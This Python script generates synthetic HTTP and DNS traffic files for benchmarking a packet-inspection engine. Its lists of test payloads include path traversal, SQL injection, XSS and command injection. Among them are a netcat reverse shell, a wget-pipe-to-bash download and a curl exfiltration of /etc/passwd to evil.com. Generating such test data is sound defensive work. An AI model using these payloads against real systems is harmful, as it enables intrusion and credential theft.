#!/usr/bin/env python3
"""
ZDPI Traffic Generator using Scapy.

Generates realistic network payloads for DFA benchmarking.
Creates binary payload files: [uint32_t len][payload bytes]...

Traffic categories:
  - Normal HTTP traffic (GET/POST/responses)
  - Attack payloads (path traversal, SQL injection, XSS, command injection)
  - DNS queries and responses
  - Mixed/random binary traffic
  - Large-scale datasets (10K+ packets)

Usage:
    python3 gen_traffic.py [-o OUTPUT_DIR] [-n NUM_PACKETS]

Requires: scapy (pip install scapy)
"""

import argparse
import os
import random
import struct
import sys
import string

# Suppress scapy warnings
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import IP, TCP, UDP, Raw, DNS, DNSQR, DNSRR


def write_payloads(payloads, filepath):
    """Write payloads as binary: [u32 len][bytes]..."""
    total_bytes = 0
    with open(filepath, "wb") as f:
        for p in payloads:
            if isinstance(p, str):
                p = p.encode("utf-8", errors="replace")
            f.write(struct.pack("<I", len(p)))
            f.write(p)
            total_bytes += len(p)
    return len(payloads), total_bytes


def gen_normal_http(n):
    """Generate normal HTTP request/response payloads."""
    payloads = []
    paths = [
        "/", "/index.html", "/api/v1/users", "/static/css/style.css",
        "/images/logo.png", "/favicon.ico", "/robots.txt",
        "/api/v1/products?page=1&limit=50", "/login", "/dashboard",
        "/search?q=hello+world", "/docs/getting-started",
    ]
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "curl/8.5.0",
        "python-requests/2.31.0",
    ]
    hosts = [
        "example.com", "api.example.com", "cdn.example.net",
        "www.testsite.org", "192.168.1.100",
    ]

    for _ in range(n):
        method = random.choice(["GET", "POST", "PUT", "DELETE", "HEAD"])
        path = random.choice(paths)
        host = random.choice(hosts)
        ua = random.choice(user_agents)

        req = (
            f"{method} {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: text/html,application/json\r\n"
            f"Accept-Encoding: gzip, deflate\r\n"
            f"Connection: keep-alive\r\n"
        )

        if method == "POST":
            body = '{"key": "value", "count": %d}' % random.randint(1, 1000)
            req += f"Content-Type: application/json\r\n"
            req += f"Content-Length: {len(body)}\r\n"
            req += f"\r\n{body}"
        else:
            req += "\r\n"

        payloads.append(req.encode())

    # Add some HTTP responses
    for _ in range(n // 4):
        status = random.choice(["200 OK", "301 Moved", "404 Not Found",
                                "500 Internal Server Error"])
        body = "<html><body>Hello World</body></html>"
        resp = (
            f"HTTP/1.1 {status}\r\n"
            f"Content-Type: text/html\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Server: nginx/1.25\r\n"
            f"\r\n{body}"
        )
        payloads.append(resp.encode())

    return payloads


def gen_attack_path_traversal(n):
    """Generate path traversal attack payloads."""
    payloads = []
    traversals = [
        "/../../../etc/passwd",
        "/..\\..\\..\\windows\\system32\\config\\sam",
        "/%2e%2e/%2e%2e/%2e%2e/etc/shadow",
        "/....//....//....//etc/passwd",
        "/../../../proc/self/environ",
        "/../../../etc/hosts",
        "/..%252f..%252f..%252fetc/passwd",
        "/../../../var/log/auth.log",
    ]

    for _ in range(n):
        path = random.choice(traversals)
        req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: target.com\r\n"
            f"User-Agent: Mozilla/5.0\r\n"
            f"\r\n"
        )
        payloads.append(req.encode())

    return payloads


def gen_attack_sql_injection(n):
    """Generate SQL injection attack payloads."""
    payloads = []
    sqli = [
        "' OR 1=1--",
        "' UNION SELECT username,password FROM users--",
        "1; DROP TABLE users;--",
        "' AND 1=0 UNION SELECT NULL,NULL,table_name FROM information_schema.tables--",
        "admin'--",
        "' OR ''='",
        "1' ORDER BY 1--+",
        "1' UNION SELECT NULL,CONCAT(user(),version()),NULL--",
        "-1 OR 1=1",
        "' UNION ALL SELECT NULL,NULL,NULL--",
        "1; INSERT INTO users VALUES('hacker','pwned')--",
        "1' AND (SELECT COUNT(*) FROM users) > 0--",
        "' OR 'x'='x",
        "1' UNION SELECT load_file('/etc/passwd')--",
        "'; EXEC xp_cmdshell('whoami');--",
        "' DELETE FROM users WHERE ''='",
        "1 AND SLEEP(5)--",
        "' UNION SELECT @@version--",
    ]

    for _ in range(n):
        payload_str = random.choice(sqli)
        method = random.choice(["GET", "POST"])
        if method == "GET":
            req = (
                f"GET /search?q={payload_str} HTTP/1.1\r\n"
                f"Host: target.com\r\n\r\n"
            )
        else:
            body = f"username={payload_str}&password=test"
            req = (
                f"POST /login HTTP/1.1\r\n"
                f"Host: target.com\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"\r\n{body}"
            )
        payloads.append(req.encode())

    return payloads


def gen_attack_xss(n):
    """Generate XSS attack payloads."""
    payloads = []
    xss = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        'javascript:alert(document.cookie)',
        '<body onload=alert(1)>',
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
        '<iframe src="javascript:alert(1)">',
        '<input onfocus=alert(1) autofocus>',
        '<a href="javascript:alert(1)">click</a>',
        '<details open ontoggle=alert(1)>',
        '<marquee onstart=alert(1)>',
        "'-alert(1)-'",
        '<math><mtext><table><mglyph><svg><mtext><textarea><path>',
    ]

    for _ in range(n):
        payload_str = random.choice(xss)
        req = (
            f"GET /page?q={payload_str} HTTP/1.1\r\n"
            f"Host: target.com\r\n"
            f"Cookie: session=abc123\r\n"
            f"\r\n"
        )
        payloads.append(req.encode())

    return payloads


def gen_attack_cmd_injection(n):
    """Generate command injection payloads."""
    payloads = []
    cmds = [
        "; cat /etc/passwd",
        "| ls -la /",
        "`whoami`",
        "$(cat /etc/shadow)",
        "; /bin/sh -c 'id'",
        "| nc attacker.com 4444 -e /bin/bash",
        "; wget http://evil.com/shell.sh | bash",
        "& cmd.exe /c dir",
        "| curl http://evil.com/exfil?data=$(cat /etc/passwd)",
        "; python3 -c 'import os; os.system(\"id\")'",
        "$(eval('import os; os.system(\"whoami\")'))",
        "; exec('/bin/sh')",
        "| system('cat /etc/hosts')",
    ]

    for _ in range(n):
        cmd = random.choice(cmds)
        body = f"hostname=localhost{cmd}"
        req = (
            f"POST /api/ping HTTP/1.1\r\n"
            f"Host: target.com\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"\r\n{body}"
        )
        payloads.append(req.encode())

    return payloads


def gen_dns_traffic(n):
    """Generate DNS query payloads."""
    payloads = []
    domains = [
        "example.com", "google.com", "github.com", "api.service.local",
        "suspicious-domain.xyz", "c2-server.onion.ws",
        "data-exfil.evil.com", "cdn.legitimate.net",
    ]

    for _ in range(n):
        domain = random.choice(domains)
        pkt = DNS(
            id=random.randint(0, 65535),
            qr=0,
            rd=1,
            qd=DNSQR(qname=domain, qtype="A"),
        )
        payloads.append(bytes(pkt))

    return payloads


def gen_random_binary(n, min_size=64, max_size=1500):
    """Generate random binary payloads."""
    payloads = []
    for _ in range(n):
        size = random.randint(min_size, max_size)
        payloads.append(os.urandom(size))
    return payloads


def gen_mixed_realistic(n):
    """Generate a realistic mix: 70% normal, 30% attacks."""
    payloads = []
    normal_count = int(n * 0.70)
    attack_count = n - normal_count

    payloads.extend(gen_normal_http(normal_count))

    per_type = attack_count // 4
    payloads.extend(gen_attack_path_traversal(per_type))
    payloads.extend(gen_attack_sql_injection(per_type))
    payloads.extend(gen_attack_xss(per_type))
    payloads.extend(gen_attack_cmd_injection(
        attack_count - 3 * per_type))

    random.shuffle(payloads)
    return payloads


def gen_large_scale(n):
    """Generate large-scale mixed traffic (for stress testing)."""
    payloads = []

    # 60% normal HTTP
    payloads.extend(gen_normal_http(int(n * 0.60)))
    # 10% DNS
    payloads.extend(gen_dns_traffic(int(n * 0.10)))
    # 10% random binary
    payloads.extend(gen_random_binary(int(n * 0.10)))
    # 5% each attack type
    payloads.extend(gen_attack_path_traversal(int(n * 0.05)))
    payloads.extend(gen_attack_sql_injection(int(n * 0.05)))
    payloads.extend(gen_attack_xss(int(n * 0.05)))
    payloads.extend(gen_attack_cmd_injection(int(n * 0.05)))

    random.shuffle(payloads)
    return payloads


def main():
    parser = argparse.ArgumentParser(
        description="ZDPI Traffic Generator (scapy-based)")
    parser.add_argument(
        "-o", "--output-dir",
        default=os.path.join(os.path.dirname(__file__), "traffic"),
        help="Output directory for payload files")
    parser.add_argument(
        "-n", "--num-packets", type=int, default=1000,
        help="Base number of packets per category")
    parser.add_argument(
        "-N", "--large-scale", type=int, default=10000,
        help="Number of packets for large-scale test")
    args = parser.parse_args()

    os.makedirs(args.output_dir, exist_ok=True)
    n = args.num_packets

    datasets = [
        ("normal_http", gen_normal_http, n),
        ("attack_path_traversal", gen_attack_path_traversal, n),
        ("attack_sql_injection", gen_attack_sql_injection, n),
        ("attack_xss", gen_attack_xss, n),
        ("attack_cmd_injection", gen_attack_cmd_injection, n),
        ("dns_traffic", gen_dns_traffic, n),
        ("random_binary", gen_random_binary, n),
        ("mixed_realistic", gen_mixed_realistic, n),
        ("large_scale", gen_large_scale, args.large_scale),
    ]

    print(f"Generating traffic datasets to {args.output_dir}/")
    print(f"Base packet count: {n}, Large-scale: {args.large_scale}")
    print()

    total_packets = 0
    total_bytes = 0

    for name, gen_func, count in datasets:
        filepath = os.path.join(args.output_dir, f"{name}.bin")
        payloads = gen_func(count)
        pkt_count, byte_count = write_payloads(payloads, filepath)
        total_packets += pkt_count
        total_bytes += byte_count
        avg_size = byte_count / pkt_count if pkt_count > 0 else 0
        print(f"  {name:30s}  {pkt_count:6d} pkts  "
              f"{byte_count:10d} bytes  (avg {avg_size:.0f} B/pkt)")

    print()
    print(f"Total: {total_packets} packets, "
          f"{total_bytes / (1024*1024):.1f} MB")
    print(f"Files written to: {args.output_dir}/")


if __name__ == "__main__":
    main()
